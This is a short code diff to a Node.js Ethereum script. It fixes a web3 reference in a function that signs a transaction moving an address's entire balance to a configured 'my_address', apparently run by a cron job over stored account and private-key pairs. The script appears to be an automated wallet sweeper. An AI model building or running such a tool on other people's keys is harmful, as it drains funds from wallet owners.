@@ -5,6 +5,8 @@ const sleep = require("sleep");
 const config = require("./config.json");
 const Web3 = require('web3');
 const Tx = require('ethereumjs-tx');
+// web3 server
+var web3 = new Web3(new Web3.providers.HttpProvider(config.web3_server));
 
 // 定时任务
 var CronJob = require('cron').CronJob;
@@ -70,15 +72,13 @@ var InsertData = function(dbo, account, privateKey, callback) {
 };
 
 function getBalance(address, privateKey){
-	var balance = web.eth.getBalance(address);
+	var balance = web3.eth.getBalance(address);
 	if (balance>0) {
 		const gas = 21000;
-		const gasPrice = 2500000000;
+		const gasPrice = 2500000000;	// 2.5 GWei
 		var nonce = web3.eth.getTransactionCount(address);
 		balance -= gas*gasPrice;
 		rawTx = {to:config.my_address, value:web3.toHex(balance), gas:gas, gasPrice:gasPrice, nonce:nonce};
-
-	    rawTx.nonce = web3.eth.getTransactionCount(config.web3_server);
 	    //rawTx.gas = web3.eth.estimateGas(rawTx);
 	    console.log(rawTx);
 	    var tx = new Tx(rawTx);
